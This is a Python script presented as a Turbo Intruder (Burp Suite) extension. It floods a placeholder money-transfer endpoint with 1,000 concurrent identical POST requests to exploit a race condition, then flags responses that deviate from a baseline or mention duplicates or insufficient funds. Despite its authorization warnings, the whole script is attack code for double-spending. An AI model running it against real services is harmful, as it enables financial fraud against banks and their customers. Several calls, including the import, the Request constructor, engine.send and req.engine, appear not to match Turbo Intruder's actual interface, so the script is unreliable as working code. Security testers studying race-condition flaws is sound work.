# Turbo Intruder script: race condition testing (use only with explicit authorization)
# Save this as a .py file and load into Burp -> Turbo Intruder.
# WARNING: Only run against systems you own or have written permission to test.

from turbo_intruder import RequestEngine, Request

# ====== CONFIG ======
CONCURRENT_CONNECTIONS = 40
REQUESTS_PER_CONNECTION = 25
TOTAL_ITERATIONS = 1000
LENGTH_DIFF_THRESHOLD = 20
# ====================


def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target,
                           concurrentConnections=CONCURRENT_CONNECTIONS,
                           requestsPerConnection=REQUESTS_PER_CONNECTION,
                           pipeline=False)

    # Baseline request (adjust path/body/headers to match the target)
    baseline_req = Request(method="POST",
                           path="/TRANSFER_PATH",
                           headers=[("Host", target.host), ("User-Agent", "TurboIntruder"), ("Content-Type", "application/x-www-form-urlencoded")],
                           body="from=acctA&to=acctB&amount=1")
    baseline_resp = engine.send(baseline_req)
    engine.baseline_len = len(baseline_resp.body or b"")
    engine.baseline_status = baseline_resp.status

    for i in range(TOTAL_ITERATIONS):
        body = "from=acctA&to=acctB&amount=1"
        req = Request(method="POST",
                      path="/TRANSFER_PATH",
                      headers=[("Host", target.host), ("User-Agent", "TurboIntruder"), ("Content-Type", "application/x-www-form-urlencoded")],
                      body=body)
        engine.queue(req)

    engine.start()
    engine.shutdown()


def handleResponse(req, interesting):
    resp = req.response
    if resp is None:
        return

    status = resp.status
    body = resp.body or b""
    length = len(body)

    if status != req.engine.baseline_status or abs(length - req.engine.baseline_len) > LENGTH_DIFF_THRESHOLD:
        interesting.add(req)
        req.engine.log("Interesting response: status=%d, len=%d (baseline %d)  %s" %
                       (status, length, req.engine.baseline_len, req.id))

    text = body.decode(errors="ignore")
    if any(k in text.lower() for k in ("duplicate", "insufficient", "error", "race", "conflict")):
        interesting.add(req)
        req.engine.log("Keyword match in response for request %s: %s" % (req.id, text[:120]))
